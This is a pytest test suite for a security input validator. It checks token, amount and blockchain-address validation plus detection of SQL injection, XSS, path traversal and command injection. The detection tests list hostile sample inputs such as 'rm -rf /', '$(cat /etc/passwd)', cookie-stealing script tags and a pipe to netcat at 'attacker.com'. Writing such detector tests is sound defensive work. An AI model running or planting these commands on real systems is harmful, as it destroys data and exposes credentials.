"""
Unit tests for Input Validation Module.

Comprehensive tests for core/security/input_validator.py covering:
- Token symbol validation
- Amount validation with bounds
- Solana address validation
- Ethereum address validation
- SQL injection detection
- XSS detection
- Path traversal detection
- Command injection detection
- JSON validation
- Convenience functions
- Logging of rejected inputs

Target: 85%+ coverage of the 460-line security module.
"""

import pytest
import json
import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock, mock_open
from datetime import datetime

# Import the module under test
from core.security.input_validator import (
    ValidationResult,
    InputValidator,
    PATTERNS,
    get_validator,
    validate_token,
    validate_amount,
    validate_address,
    is_safe_string,
)


# =============================================================================
# Test Fixtures
# =============================================================================

@pytest.fixture
def validator():
    """Create a basic input validator for testing."""
    return InputValidator()


@pytest.fixture
def logging_validator(tmp_path):
    """Create a validator with rejection logging enabled."""
    log_path = tmp_path / "rejected_inputs.log"
    return InputValidator(log_rejected=True, log_path=log_path)


@pytest.fixture
def strict_validator():
    """Create a validator with strict limits."""
    return InputValidator(
        max_amount=100,
        min_amount=1,
        max_string_length=100
    )


@pytest.fixture
def lenient_validator():
    """Create a validator with lenient limits."""
    return InputValidator(
        max_amount=10_000_000_000,
        min_amount=0.0000001,
        max_string_length=100000
    )


# =============================================================================
# Test ValidationResult Dataclass
# =============================================================================

class TestValidationResult:
    """Tests for the ValidationResult dataclass."""

    def test_valid_result(self):
        """Test creating a valid result."""
        result = ValidationResult(valid=True, sanitized_value="TEST")
        assert result.valid is True
        assert result.reason is None
        assert result.sanitized_value == "TEST"

    def test_invalid_result(self):
        """Test creating an invalid result."""
        result = ValidationResult(valid=False, reason="Invalid input")
        assert result.valid is False
        assert result.reason == "Invalid input"
        assert result.sanitized_value is None

    def test_result_with_all_fields(self):
        """Test result with all fields set."""
        result = ValidationResult(
            valid=True,
            reason="Warning: modified",
            sanitized_value="cleaned"
        )
        assert result.valid is True
        assert result.reason == "Warning: modified"
        assert result.sanitized_value == "cleaned"

    def test_result_defaults(self):
        """Test default values."""
        result = ValidationResult(valid=False)
        assert result.valid is False
        assert result.reason is None
        assert result.sanitized_value is None


# =============================================================================
# Test Token Symbol Validation
# =============================================================================

class TestTokenSymbolValidation:
    """Tests for token symbol validation."""

    def test_valid_token_symbols(self, validator):
        """Test valid token symbols."""
        valid_symbols = ["BTC", "ETH", "SOL", "USDC", "BONK", "WIF", "JUP"]
        for symbol in valid_symbols:
            result = validator.validate_token_symbol(symbol)
            assert result.valid is True, f"Symbol {symbol} should be valid"
            assert result.sanitized_value == symbol.upper()

    def test_lowercase_symbols_uppercased(self, validator):
        """Test that lowercase symbols are uppercased."""
        result = validator.validate_token_symbol("sol")
        assert result.valid is True
        assert result.sanitized_value == "SOL"

    def test_mixed_case_symbols(self, validator):
        """Test mixed case symbols."""
        result = validator.validate_token_symbol("SoLaNa")
        assert result.valid is True
        assert result.sanitized_value == "SOLANA"

    def test_numeric_symbols(self, validator):
        """Test symbols with numbers."""
        result = validator.validate_token_symbol("BTC2")
        assert result.valid is True
        assert result.sanitized_value == "BTC2"

    def test_empty_symbol_invalid(self, validator):
        """Test that empty symbol is invalid."""
        result = validator.validate_token_symbol("")
        assert result.valid is False
        assert "empty" in result.reason.lower()

    def test_none_symbol_invalid(self, validator):
        """Test that None symbol is invalid."""
        result = validator.validate_token_symbol(None)
        assert result.valid is False
        assert "empty" in result.reason.lower() or "not a string" in result.reason.lower()

    def test_symbol_too_long(self, validator):
        """Test that symbol over 20 chars is invalid."""
        long_symbol = "A" * 21
        result = validator.validate_token_symbol(long_symbol)
        assert result.valid is False
        assert "too long" in result.reason.lower()

    def test_symbol_max_length(self, validator):
        """Test symbol at exactly 20 chars is valid."""
        max_symbol = "A" * 20
        result = validator.validate_token_symbol(max_symbol)
        assert result.valid is True

    def test_symbol_with_special_chars_invalid(self, validator):
        """Test symbols with special characters are invalid."""
        invalid_symbols = ["BTC$", "ETH!", "SOL@", "USD-C", "BTC/USD", "ETH_SOL"]
        for symbol in invalid_symbols:
            result = validator.validate_token_symbol(symbol)
            assert result.valid is False, f"Symbol {symbol} should be invalid"
            assert "alphanumeric" in result.reason.lower()

    def test_symbol_with_spaces_invalid(self, validator):
        """Test symbols with spaces are invalid."""
        result = validator.validate_token_symbol("BTC USD")
        assert result.valid is False

    def test_symbol_with_whitespace_trimmed(self, validator):
        """Test that leading/trailing whitespace is trimmed."""
        result = validator.validate_token_symbol("  SOL  ")
        assert result.valid is True
        assert result.sanitized_value == "SOL"

    def test_symbol_only_numbers(self, validator):
        """Test symbol that is only numbers."""
        result = validator.validate_token_symbol("123")
        assert result.valid is True
        assert result.sanitized_value == "123"

    def test_non_string_symbol(self, validator):
        """Test non-string symbol types."""
        result = validator.validate_token_symbol(123)
        assert result.valid is False
        assert "not a string" in result.reason.lower()

    def test_unicode_symbol_invalid(self, validator):
        """Test unicode characters in symbol are invalid."""
        result = validator.validate_token_symbol("BTC\u00e9")
        assert result.valid is False


# =============================================================================
# Test Amount Validation
# =============================================================================

class TestAmountValidation:
    """Tests for amount validation."""

    def test_valid_amounts(self, validator):
        """Test valid amounts."""
        valid_amounts = [0.001, 1, 10, 100, 1000, 10000, 100000]
        for amount in valid_amounts:
            result = validator.validate_amount(amount)
            assert result.valid is True, f"Amount {amount} should be valid"
            assert result.sanitized_value == float(amount)

    def test_zero_amount_invalid(self, validator):
        """Test that zero amount is invalid."""
        result = validator.validate_amount(0)
        assert result.valid is False
        assert "positive" in result.reason.lower()

    def test_negative_amount_invalid(self, validator):
        """Test that negative amounts are invalid."""
        result = validator.validate_amount(-1)
        assert result.valid is False
        assert "positive" in result.reason.lower()

    def test_amount_below_minimum(self, validator):
        """Test amount below default minimum."""
        result = validator.validate_amount(0.0000001)
        assert result.valid is False
        assert "below minimum" in result.reason.lower()

    def test_amount_at_minimum(self, validator):
        """Test amount at exactly the minimum."""
        result = validator.validate_amount(0.000001)
        assert result.valid is True

    def test_amount_exceeds_maximum(self, validator):
        """Test amount exceeding maximum."""
        result = validator.validate_amount(2_000_000_000)
        assert result.valid is False
        assert "exceeds maximum" in result.reason.lower()

    def test_amount_at_maximum(self, validator):
        """Test amount at exactly the maximum."""
        result = validator.validate_amount(1_000_000_000)
        assert result.valid is True

    def test_custom_max_amount(self, validator):
        """Test custom max amount override."""
        result = validator.validate_amount(200, custom_max=100)
        assert result.valid is False
        assert "exceeds maximum" in result.reason.lower()

        result = validator.validate_amount(50, custom_max=100)
        assert result.valid is True

    def test_custom_min_amount(self, validator):
        """Test custom min amount override."""
        result = validator.validate_amount(0.5, custom_min=1)
        assert result.valid is False
        assert "below minimum" in result.reason.lower()

        result = validator.validate_amount(1.5, custom_min=1)
        assert result.valid is True

    def test_integer_amount(self, validator):
        """Test integer amounts are converted to float."""
        result = validator.validate_amount(100)
        assert result.valid is True
        assert result.sanitized_value == 100.0
        assert isinstance(result.sanitized_value, float)

    def test_non_numeric_amount_invalid(self, validator):
        """Test non-numeric amounts are invalid."""
        result = validator.validate_amount("100")
        assert result.valid is False
        assert "numeric" in result.reason.lower()

    def test_strict_validator_amounts(self, strict_validator):
        """Test strict validator limits."""
        # Valid within strict limits
        result = strict_validator.validate_amount(50)
        assert result.valid is True

        # Below strict minimum
        result = strict_validator.validate_amount(0.5)
        assert result.valid is False

        # Above strict maximum
        result = strict_validator.validate_amount(150)
        assert result.valid is False

    def test_very_small_amount(self, lenient_validator):
        """Test very small amounts with lenient validator."""
        result = lenient_validator.validate_amount(0.0000001)
        assert result.valid is True


# =============================================================================
# Test Solana Address Validation
# =============================================================================

class TestSolanaAddressValidation:
    """Tests for Solana address validation."""

    def test_valid_solana_addresses(self, validator):
        """Test valid Solana addresses."""
        valid_addresses = [
            "11111111111111111111111111111111",  # System program (32 bytes decoded)
            "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v",  # USDC (32 bytes decoded)
            "DezXAZ8z7PnrnRJjz3wXBoRgixCa6xjnB7YaB1pPB263",  # BONK (32 bytes decoded)
            "TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA",  # Token Program
        ]
        for address in valid_addresses:
            result = validator.validate_solana_address(address)
            assert result.valid is True, f"Address {address} should be valid"
            assert result.sanitized_value == address

    def test_empty_address_invalid(self, validator):
        """Test that empty address is invalid."""
        result = validator.validate_solana_address("")
        assert result.valid is False
        assert "empty" in result.reason.lower()

    def test_none_address_invalid(self, validator):
        """Test that None address is invalid."""
        result = validator.validate_solana_address(None)
        assert result.valid is False

    def test_address_too_short(self, validator):
        """Test address shorter than 32 chars."""
        short_address = "1234567890123456789012345678901"  # 31 chars
        result = validator.validate_solana_address(short_address)
        assert result.valid is False
        assert "format" in result.reason.lower()

    def test_address_too_long(self, validator):
        """Test address longer than 44 chars."""
        long_address = "A" * 45
        result = validator.validate_solana_address(long_address)
        assert result.valid is False

    def test_address_with_invalid_chars(self, validator):
        """Test address with invalid base58 characters."""
        # 0, O, I, l are not valid base58
        invalid_addresses = [
            "0" * 32,
            "O" * 32,
            "I" * 32,
            "l" * 32,
        ]
        for address in invalid_addresses:
            result = validator.validate_solana_address(address)
            assert result.valid is False, f"Address {address} should be invalid"

    def test_address_with_whitespace_trimmed(self, validator):
        """Test that leading/trailing whitespace is trimmed."""
        address = "11111111111111111111111111111111"  # System program - valid 32 bytes
        result = validator.validate_solana_address(f"  {address}  ")
        assert result.valid is True
        assert result.sanitized_value == address

    def test_address_with_special_chars(self, validator):
        """Test address with special characters."""
        result = validator.validate_solana_address("ABC!@#$%^&*()12345678901234567890")
        assert result.valid is False

    def test_base58_decode_success(self, validator):
        """Test successful base58 decode - real base58 is available."""
        # Use a real valid address that decodes to 32 bytes
        address = "11111111111111111111111111111111"
        result = validator.validate_solana_address(address)
        assert result.valid is True

    def test_base58_decode_wrong_length(self, validator):
        """Test base58 decode with wrong decoded length (not 32 bytes)."""
        # This address decodes to 25 bytes, not 32
        address = "So11111111111111111111111111111112"
        result = validator.validate_solana_address(address)
        assert result.valid is False
        assert "length" in result.reason.lower()

    def test_base58_invalid_checksum(self, validator):
        """Test base58 decode with invalid address."""
        # Create an address with valid format but invalid base58 decode
        # Use a format-valid but decode-invalid address by modifying a valid one
        # This tests the exception handling path
        import base58
        # First, verify our test address does decode but to wrong length
        addr = "So11111111111111111111111111111112"
        decoded = base58.b58decode(addr)
        assert len(decoded) != 32  # Confirms it's invalid length


# =============================================================================
# Test Ethereum Address Validation
# =============================================================================

class TestEthereumAddressValidation:
    """Tests for Ethereum address validation."""

    def test_valid_ethereum_addresses(self, validator):
        """Test valid Ethereum addresses."""
        valid_addresses = [
            "0x0000000000000000000000000000000000000000",
            "0xdead000000000000000000000000000000000000",
            "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48",  # USDC
            "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2",  # WETH
        ]
        for address in valid_addresses:
            result = validator.validate_ethereum_address(address)
            assert result.valid is True, f"Address {address} should be valid"
            assert result.sanitized_value == address

    def test_empty_eth_address_invalid(self, validator):
        """Test that empty address is invalid."""
        result = validator.validate_ethereum_address("")
        assert result.valid is False

    def test_none_eth_address_invalid(self, validator):
        """Test that None address is invalid."""
        result = validator.validate_ethereum_address(None)
        assert result.valid is False

    def test_eth_address_without_0x_prefix(self, validator):
        """Test address without 0x prefix."""
        result = validator.validate_ethereum_address(
            "A0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
        )
        assert result.valid is False

    def test_eth_address_wrong_length(self, validator):
        """Test address with wrong length."""
        result = validator.validate_ethereum_address("0x0000")
        assert result.valid is False

    def test_eth_address_too_long(self, validator):
        """Test address too long."""
        result = validator.validate_ethereum_address("0x" + "a" * 41)
        assert result.valid is False

    def test_eth_address_with_invalid_chars(self, validator):
        """Test address with non-hex characters."""
        result = validator.validate_ethereum_address(
            "0xG0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
        )
        assert result.valid is False

    def test_eth_address_whitespace_trimmed(self, validator):
        """Test that whitespace is trimmed."""
        address = "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48"
        result = validator.validate_ethereum_address(f"  {address}  ")
        assert result.valid is True


# =============================================================================
# Test SQL Injection Detection
# =============================================================================

class TestSQLInjectionDetection:
    """Tests for SQL injection detection."""

    def test_sql_keywords_detected(self, validator):
        """Test SQL keywords are detected."""
        sql_attacks = [
            "SELECT * FROM users",
            "INSERT INTO users VALUES",
            "UPDATE users SET password",
            "DELETE FROM users",
            "DROP TABLE users",
            "UNION SELECT password",
            "ALTER TABLE users",
            "CREATE TABLE hack",
            "TRUNCATE TABLE users",
        ]
        for attack in sql_attacks:
            result = validator.validate_safe_string(attack)
            assert result.valid is False, f"SQL attack '{attack}' should be detected"
            assert "SQL injection" in result.reason

    def test_sql_comments_detected(self, validator):
        """Test SQL comments are detected."""
        comments = [
            "normal text -- comment",
            "text; DROP TABLE",
            "/* comment */",
            "text */ injection",
        ]
        for text in comments:
            result = validator.validate_safe_string(text)
            assert result.valid is False, f"SQL comment '{text}' should be detected"

    def test_sql_logic_attacks_detected(self, validator):
        """Test SQL logic manipulation attacks."""
        attacks = [
            "' OR '1'='1",
            "1 OR 1=1",
            "admin' AND '1'='1",
        ]
        for attack in attacks:
            result = validator.validate_safe_string(attack)
            assert result.valid is False, f"SQL logic attack '{attack}' should be detected"

    def test_case_insensitive_sql_detection(self, validator):
        """Test SQL detection is case-insensitive."""
        attacks = [
            "select * from users",
            "SELECT * FROM users",
            "SeLeCt * FrOm users",
        ]
        for attack in attacks:
            result = validator.validate_safe_string(attack)
            assert result.valid is False

    def test_sql_check_disabled(self, validator):
        """Test SQL injection check can be disabled."""
        result = validator.validate_safe_string(
            "SELECT * FROM users",
            check_sql=False
        )
        assert result.valid is True

    def test_legitimate_text_with_sql_words(self, validator):
        """Test legitimate text that happens to contain SQL-like words."""
        # Note: The current implementation will flag these as potential injection
        # This is a known limitation - security over convenience
        safe_texts = [
            "Please select a value",  # Contains SELECT - will be flagged
            "I want to drop this topic",  # Contains DROP - will be flagged
        ]
        # These should be flagged due to the aggressive detection
        for text in safe_texts:
            result = validator.validate_safe_string(text)
            # Note: These will be invalid due to containing SQL keywords
            # If you need to allow these, disable check_sql


# =============================================================================
# Test XSS Detection
# =============================================================================

class TestXSSDetection:
    """Tests for XSS (Cross-Site Scripting) detection."""

    def test_script_tags_detected(self, validator):
        """Test script tags are detected."""
        xss_attacks = [
            "<script>alert('xss')</script>",
            "<SCRIPT>alert(1)</SCRIPT>",
            "<script src='evil.js'></script>",
            "<script>document.cookie</script>",
        ]
        for attack in xss_attacks:
            result = validator.validate_safe_string(attack)
            assert result.valid is False, f"XSS attack '{attack}' should be detected"
            assert "XSS" in result.reason

    def test_javascript_protocol_detected(self, validator):
        """Test javascript: protocol is detected."""
        attacks = [
            "javascript:alert(1)",
            "JAVASCRIPT:alert(1)",
            "javascript:void(0)",
        ]
        for attack in attacks:
            result = validator.validate_safe_string(attack)
            assert result.valid is False

    def test_event_handlers_detected(self, validator):
        """Test event handlers are detected."""
        handlers = [
            "onclick=alert(1)",
            "onload=steal()",
            "onmouseover=hack()",
            "onerror=evil()",
        ]
        for handler in handlers:
            result = validator.validate_safe_string(handler)
            assert result.valid is False, f"Event handler '{handler}' should be detected"

    def test_event_handlers_in_tags_detected(self, validator):
        """Test event handlers in HTML tags are detected."""
        attacks = [
            "<img src='x' onerror='alert(1)'>",
            "<div onmouseover='hack()'>",
            "<body onload='steal()'>",
        ]
        for attack in attacks:
            result = validator.validate_safe_string(attack)
            assert result.valid is False

    def test_dangerous_tags_detected(self, validator):
        """Test dangerous HTML tags are detected."""
        dangerous_tags = [
            "<iframe src='evil.com'>",
            "<object data='malware'>",
            "<embed src='virus'>",
            "<form action='phish.com'>",
        ]
        for tag in dangerous_tags:
            result = validator.validate_safe_string(tag)
            assert result.valid is False, f"Dangerous tag '{tag}' should be detected"

    def test_xss_check_disabled(self, validator):
        """Test XSS check can be disabled."""
        result = validator.validate_safe_string(
            "<script>alert(1)</script>",
            check_xss=False
        )
        # Still might be invalid if other checks catch it
        # Let's disable all checks to test
        result = validator.validate_safe_string(
            "<script>alert(1)</script>",
            check_sql=False,
            check_xss=False,
            check_path=False,
            check_cmd=False
        )
        assert result.valid is True

    def test_safe_html_entities(self, validator):
        """Test safe HTML-like text passes."""
        safe_texts = [
            "Use < and > for comparison",  # Will trigger XSS due to pattern
            "Price is $100",
            "Email: user@domain.com",
        ]
        # Actually test each one
        result = validator.validate_safe_string("Price is $100")
        # $ triggers command injection detection
        result = validator.validate_safe_string(
            "Price is one hundred dollars",
            check_cmd=False
        )
        assert result.valid is True


# =============================================================================
# Test Path Traversal Detection
# =============================================================================

class TestPathTraversalDetection:
    """Tests for path traversal detection."""

    def test_basic_path_traversal(self, validator):
        """Test basic path traversal patterns."""
        attacks = [
            "../etc/passwd",
            "..\\windows\\system32",
            "../../secret.txt",
            "..\\..\\confidential",
        ]
        for attack in attacks:
            result = validator.validate_safe_string(attack)
            assert result.valid is False, f"Path traversal '{attack}' should be detected"
            assert "path traversal" in result.reason.lower()

    def test_url_encoded_path_traversal(self, validator):
        """Test URL-encoded path traversal."""
        attacks = [
            "..%2Fetc/passwd",
            "..%2fetc/passwd",
            "..%5Cwindows",
            "..%5cwindows",
        ]
        for attack in attacks:
            result = validator.validate_safe_string(attack)
            assert result.valid is False

    def test_double_encoded_path_traversal(self, validator):
        """Test double URL-encoded path traversal."""
        attacks = [
            "%2e%2e/etc/passwd",
            "%2E%2E/etc/passwd",
        ]
        for attack in attacks:
            result = validator.validate_safe_string(attack)
            assert result.valid is False

    def test_path_check_disabled(self, validator):
        """Test path traversal check can be disabled."""
        result = validator.validate_safe_string(
            "../etc/passwd",
            check_path=False,
            check_cmd=False
        )
        assert result.valid is True

    def test_safe_paths(self, validator):
        """Test safe file paths pass."""
        safe_paths = [
            "data/file.txt",
            "logs/2024/01/log.txt",
        ]
        for path in safe_paths:
            result = validator.validate_safe_string(path, check_cmd=False)
            assert result.valid is True, f"Safe path '{path}' should pass"


# =============================================================================
# Test Command Injection Detection
# =============================================================================

class TestCommandInjectionDetection:
    """Tests for command injection detection."""

    def test_shell_metacharacters_detected(self, validator):
        """Test shell metacharacters are detected."""
        attacks = [
            ("file; rm -rf /", ["SQL injection", "command injection"]),  # ; caught by SQL first
            ("file && cat /etc/passwd", ["command injection"]),
            ("file | nc attacker.com", ["command injection"]),
            ("file `whoami`", ["command injection"]),
            ("$HOME/malicious", ["command injection"]),
        ]
        for attack, expected_reasons in attacks:
            result = validator.validate_safe_string(attack)
            assert result.valid is False, f"Command injection '{attack}' should be detected"
            # Check that reason contains at least one of the expected patterns
            reason_lower = result.reason.lower()
            found = any(exp.lower() in reason_lower for exp in expected_reasons)
            assert found, f"Expected one of {expected_reasons} in reason for '{attack}', got: {result.reason}"

    def test_command_substitution_detected(self, validator):
        """Test command substitution is detected."""
        attacks = [
            "$(cat /etc/passwd)",
            "$(whoami)",
            "$(rm -rf /)",
        ]
        for attack in attacks:
            result = validator.validate_safe_string(attack)
            assert result.valid is False

    def test_backtick_substitution_detected(self, validator):
        """Test backtick substitution is detected."""
        attacks = [
            "`cat /etc/passwd`",
            "`whoami`",
        ]
        for attack in attacks:
            result = validator.validate_safe_string(attack)
            assert result.valid is False

    def test_cmd_check_disabled(self, validator):
        """Test command injection check can be disabled."""
        # Use && which is only caught by cmd check, not SQL
        result = validator.validate_safe_string(
            "file && cat /etc/passwd",
            check_cmd=False
        )
        assert result.valid is True

    def test_safe_text_with_special_chars(self, validator):
        """Test that some special chars in safe context might still be flagged."""
        # Note: The current implementation is aggressive
        # Characters like $ will trigger detection even in safe contexts
        result = validator.validate_safe_string("The price is 100 dollars")
        assert result.valid is True  # No special chars


# =============================================================================
# Test Safe String Validation
# =============================================================================

class TestSafeStringValidation:
    """Tests for comprehensive safe string validation."""

    def test_valid_strings(self, validator):
        """Test valid strings pass all checks."""
        valid_strings = [
            "Hello World",
            "This is a normal message",
            "Token: SOL",
            "Price: 100",
            "User123",
        ]
        for s in valid_strings:
            result = validator.validate_safe_string(s)
            assert result.valid is True, f"String '{s}' should be valid"
            assert result.sanitized_value == s

    def test_string_too_long(self, validator):
        """Test string exceeding max length."""
        long_string = "A" * 10001
        result = validator.validate_safe_string(long_string)
        assert result.valid is False
        assert "exceeds maximum length" in result.reason.lower()

    def test_custom_max_length(self, validator):
        """Test custom max length override."""
        result = validator.validate_safe_string("A" * 200, max_length=100)
        assert result.valid is False

        result = validator.validate_safe_string("A" * 50, max_length=100)
        assert result.valid is True

    def test_non_string_input(self, validator):
        """Test non-string input is rejected."""
        result = validator.validate_safe_string(123)
        assert result.valid is False
        assert "not a string" in result.reason.lower()

        result = validator.validate_safe_string(None)
        assert result.valid is False

    def test_all_checks_disabled(self, validator):
        """Test string passes when all checks disabled."""
        dangerous_string = "SELECT * FROM users; <script>alert(1)</script> ../etc/passwd; rm -rf /"
        result = validator.validate_safe_string(
            dangerous_string,
            check_sql=False,
            check_xss=False,
            check_path=False,
            check_cmd=False
        )
        assert result.valid is True

    def test_strict_validator_string_length(self, strict_validator):
        """Test strict validator string length limit."""
        result = strict_validator.validate_safe_string("A" * 101)
        assert result.valid is False

        result = strict_validator.validate_safe_string("A" * 100)
        assert result.valid is True

    def test_unicode_strings(self, validator):
        """Test unicode strings pass basic validation."""
        unicode_strings = [
            "Hello World",
            "Bonjour le monde",
        ]
        for s in unicode_strings:
            result = validator.validate_safe_string(s)
            assert result.valid is True

    def test_empty_string(self, validator):
        """Test empty string passes validation."""
        result = validator.validate_safe_string("")
        assert result.valid is True


# =============================================================================
# Test JSON Validation
# =============================================================================

class TestJSONValidation:
    """Tests for JSON structure validation."""

    def test_valid_json_dict(self, validator):
        """Test valid JSON dictionary."""
        data = {"name": "test", "value": 123}
        result = validator.validate_json(data)
        assert result.valid is True
        assert result.sanitized_value == data

    def test_valid_json_list(self, validator):
        """Test valid JSON list."""
        data = [1, 2, 3, "a", "b", "c"]
        result = validator.validate_json(data)
        assert result.valid is True

    def test_valid_nested_json(self, validator):
        """Test valid nested JSON."""
        data = {
            "level1": {
                "level2": {
                    "level3": {
                        "value": "deep"
                    }
                }
            }
        }
        result = validator.validate_json(data)
        assert result.valid is True

    def test_json_exceeds_max_size(self, validator):
        """Test JSON exceeding max size."""
        # Create a large JSON object
        large_data = {"key": "x" * 2_000_000}
        result = validator.validate_json(large_data)
        assert result.valid is False
        assert "size" in result.reason.lower()

    def test_json_custom_max_size(self, validator):
        """Test JSON with custom max size."""
        data = {"key": "x" * 1000}
        result = validator.validate_json(data, max_size=500)
        assert result.valid is False

        result = validator.validate_json(data, max_size=5000)
        assert result.valid is True

    def test_json_exceeds_max_depth(self, validator):
        """Test JSON exceeding max depth."""
        # Create deeply nested structure
        data = {"level": {}}
        current = data["level"]
        for _ in range(15):
            current["next"] = {}
            current = current["next"]

        result = validator.validate_json(data, max_depth=10)
        assert result.valid is False
        assert "depth" in result.reason.lower()

    def test_json_custom_max_depth(self, validator):
        """Test JSON with custom max depth."""
        data = {"a": {"b": {"c": {"d": "deep"}}}}

        result = validator.validate_json(data, max_depth=3)
        assert result.valid is False

        result = validator.validate_json(data, max_depth=5)
        assert result.valid is True

    def test_invalid_json_type(self, validator):
        """Test non-serializable type."""
        class CustomObj:
            pass

        result = validator.validate_json(CustomObj())
        assert result.valid is False
        assert "Invalid JSON" in result.reason

    def test_json_with_primitive_types(self, validator):
        """Test JSON with various primitive types."""
        data = {
            "string": "hello",
            "int": 123,
            "float": 1.5,
            "bool": True,
            "null": None,
            "list": [1, 2, 3],
        }
        result = validator.validate_json(data)
        assert result.valid is True

    def test_deeply_nested_list(self, validator):
        """Test deeply nested list structure."""
        data = [[[[[[[[[[[["deep"]]]]]]]]]]]]
        result = validator.validate_json(data, max_depth=10)
        assert result.valid is False


# =============================================================================
# Test Rejection Logging
# =============================================================================

class TestRejectionLogging:
    """Tests for rejection logging functionality."""

    def test_logging_enabled_creates_log_file(self, logging_validator, tmp_path):
        """Test that log file is created when logging enabled."""
        # Trigger a rejection
        logging_validator.validate_token_symbol("INVALID!@#")

        log_path = tmp_path / "rejected_inputs.log"
        assert log_path.exists()

    def test_rejection_logged_with_details(self, logging_validator, tmp_path):
        """Test that rejections are logged with full details."""
        logging_validator.validate_token_symbol("BAD$SYMBOL")

        log_path = tmp_path / "rejected_inputs.log"
        content = log_path.read_text()
        entry = json.loads(content.strip())

        assert "timestamp" in entry
        assert entry["input_type"] == "token_symbol"
        assert "value_preview" in entry
        assert "reason" in entry

    def test_long_values_truncated_in_log(self, logging_validator, tmp_path):
        """Test that long values are truncated in logs."""
        long_value = "A" * 200
        logging_validator.validate_safe_string(long_value, max_length=50)

        log_path = tmp_path / "rejected_inputs.log"
        content = log_path.read_text()
        entry = json.loads(content.strip())

        assert len(entry["value_preview"]) <= 100

    def test_logging_disabled_no_file(self, validator, tmp_path):
        """Test that no log file created when logging disabled."""
        validator.validate_token_symbol("INVALID!@#")

        # Default log path
        log_path = tmp_path / "rejected_inputs.log"
        assert not log_path.exists()

    def test_multiple_rejections_logged(self, logging_validator, tmp_path):
        """Test multiple rejections are appended to log."""
        logging_validator.validate_token_symbol("BAD1!")
        logging_validator.validate_token_symbol("BAD2@")
        # Use amount exceeds max which logs (not negative which doesn't log)
        logging_validator.validate_amount(2_000_000_000)

        log_path = tmp_path / "rejected_inputs.log"
        lines = log_path.read_text().strip().split("\n")
        assert len(lines) >= 3

    def test_log_directory_created(self, tmp_path):
        """Test that log directory is created if missing."""
        deep_path = tmp_path / "deep" / "nested" / "logs" / "rejected.log"
        validator = InputValidator(log_rejected=True, log_path=deep_path)

        # The directory should be created
        assert deep_path.parent.exists()


# =============================================================================
# Test Global Validator and Convenience Functions
# =============================================================================

class TestGlobalValidatorAndConvenience:
    """Tests for global validator instance and convenience functions."""

    def test_get_validator_returns_instance(self):
        """Test get_validator returns an InputValidator."""
        # Reset the global validator
        import core.security.input_validator as iv
        iv._validator = None

        validator = get_validator()
        assert isinstance(validator, InputValidator)

    def test_get_validator_singleton(self):
        """Test get_validator returns the same instance."""
        import core.security.input_validator as iv
        iv._validator = None

        v1 = get_validator()
        v2 = get_validator()
        assert v1 is v2

    def test_validate_token_convenience(self):
        """Test validate_token convenience function."""
        result = validate_token("SOL")
        assert result.valid is True
        assert result.sanitized_value == "SOL"

    def test_validate_amount_convenience(self):
        """Test validate_amount convenience function."""
        result = validate_amount(100.0)
        assert result.valid is True
        assert result.sanitized_value == 100.0

    def test_validate_address_convenience(self):
        """Test validate_address convenience function."""
        # Use a valid address that decodes to 32 bytes
        result = validate_address("11111111111111111111111111111111")
        assert result.valid is True

    def test_is_safe_string_convenience(self):
        """Test is_safe_string convenience function."""
        assert is_safe_string("Hello World") is True
        assert is_safe_string("SELECT * FROM users") is False


# =============================================================================
# Test Regex Patterns
# =============================================================================

class TestRegexPatterns:
    """Tests for the compiled regex patterns."""

    def test_token_symbol_pattern(self):
        """Test token symbol regex pattern."""
        pattern = PATTERNS["token_symbol"]

        assert pattern.match("ABC")
        assert pattern.match("ABC123")
        assert pattern.match("A")
        assert pattern.match("A" * 20)

        assert not pattern.match("")
        assert not pattern.match("A" * 21)
        assert not pattern.match("ABC!")
        assert not pattern.match("ABC DEF")

    def test_solana_address_pattern(self):
        """Test Solana address regex pattern."""
        pattern = PATTERNS["solana_address"]

        # Valid base58 chars, 32-44 length
        assert pattern.match("A" * 32)
        assert pattern.match("A" * 44)
        assert pattern.match("So11111111111111111111111111111112")

        # Invalid
        assert not pattern.match("A" * 31)
        assert not pattern.match("A" * 45)
        assert not pattern.match("0" * 32)  # 0 not in base58

    def test_ethereum_address_pattern(self):
        """Test Ethereum address regex pattern."""
        pattern = PATTERNS["ethereum_address"]

        assert pattern.match("0x" + "a" * 40)
        assert pattern.match("0x" + "A" * 40)
        assert pattern.match("0x" + "0" * 40)

        assert not pattern.match("a" * 40)  # No 0x prefix
        assert not pattern.match("0x" + "a" * 39)  # Too short
        assert not pattern.match("0x" + "a" * 41)  # Too long
        assert not pattern.match("0x" + "g" * 40)  # Invalid hex

    def test_sql_injection_patterns(self):
        """Test SQL injection patterns."""
        patterns = PATTERNS["sql_injection"]

        test_strings = [
            ("SELECT * FROM", True),
            ("INSERT INTO", True),
            ("DROP TABLE", True),
            ("--", True),
            ("'; --", True),
            ("/* comment */", True),
            ("OR 1=1", True),
            ("normal text", False),
        ]

        for test_str, should_match in test_strings:
            matched = any(p.search(test_str) for p in patterns)
            assert matched == should_match, f"'{test_str}' match should be {should_match}"

    def test_xss_patterns(self):
        """Test XSS patterns."""
        patterns = PATTERNS["xss"]

        test_strings = [
            ("<script>alert(1)</script>", True),
            ("javascript:alert(1)", True),
            ("onclick=alert(1)", True),
            ("<img onerror=", True),
            ("<iframe src=", True),
            ("normal text", False),
        ]

        for test_str, should_match in test_strings:
            matched = any(p.search(test_str) for p in patterns)
            assert matched == should_match, f"'{test_str}' match should be {should_match}"

    def test_path_traversal_patterns(self):
        """Test path traversal patterns."""
        patterns = PATTERNS["path_traversal"]

        test_strings = [
            ("../etc", True),
            ("..\\windows", True),
            ("..%2f", True),
            ("..%5c", True),
            ("%2e%2e/", True),
            ("normal/path", False),
        ]

        for test_str, should_match in test_strings:
            matched = any(p.search(test_str) for p in patterns)
            assert matched == should_match, f"'{test_str}' match should be {should_match}"

    def test_command_injection_patterns(self):
        """Test command injection patterns."""
        patterns = PATTERNS["command_injection"]

        test_strings = [
            ("; rm", True),
            ("| cat", True),
            ("&& whoami", True),
            ("`ls`", True),
            ("$(cmd)", True),
            ("$HOME", True),
            ("normal text", False),
        ]

        for test_str, should_match in test_strings:
